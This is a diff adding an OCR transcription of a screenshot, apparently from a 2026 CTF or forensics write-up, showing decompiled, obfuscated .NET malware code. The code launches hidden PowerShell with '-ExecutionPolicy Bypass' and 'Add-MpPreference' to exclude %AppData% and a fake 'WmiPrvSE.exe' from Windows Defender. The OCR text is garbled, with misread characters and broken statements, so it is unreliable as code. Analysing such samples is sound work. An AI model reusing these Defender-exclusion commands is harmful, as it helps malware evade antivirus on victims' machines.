@@ -1,0 +1,25 @@
+# OCR: Pasted_image_20260415233137.webp
+# 来源: ./02-WriteUp/2026/2026-平航杯/Pasted_image_20260415233137.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:44
+
+153 154 155 156
+157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183
+Token:x06000027RID:39RvA:0x00002EDcFi1e0ffset:0x000010Do
+public static void j4d5GNXIcPERtyjnlgcMXk7iToiY6Ilmas5nLQFxfcp708cM7Hr1XTxfcBgO
+if (Conversions.ToBoolean
+(MUaD1UN9X5rN98KUAn5WbH3K0Z85RyCCg3gID-L08mHgWogZYUPKBUWIW2vuWanlzJDsD93oLEVaFhmWRM9urnZakxV.9wp6DW38pEGrxGQE0QkzV4F6DVSJViAZDNds09gtbzZBQrdyd059AgNPuLYcnNLjNwBFhzo8NTC1a0PH4fLXT
+Z1H0)） tr
+ProcessstartInfo processstartInfo = new ProcessstartInfo( processStartInfo.FileName = "powershell.exe"
+processstartInfo.WindowStyle = Processwindowstyle.Hidden:
+processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath ’" + AcX0qTJzEzq40qP5qFxb.8qqIc9Clrz7T3TBLTgS + Process.Start(processstartInfo).WaitForExitO:
+processstartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess Process.Start(processStartInfo).WaitForExitO:
+processstartInfo.Arguments
+= string.Concat(new string[]
+"-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath statics.%AppData%
+statics.WmiPrvSE.exe,
+Process.Start(processstartInfo).WaitForExit()
+processstartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess
+Process.Start(processstartInfo).WaitForExitO:(Exception ex)
+catch.
++ Process. GetCurrentProcessO.MainModule.ModuleName + Path.GetFileName(statics. WmiPrvSE.exe)
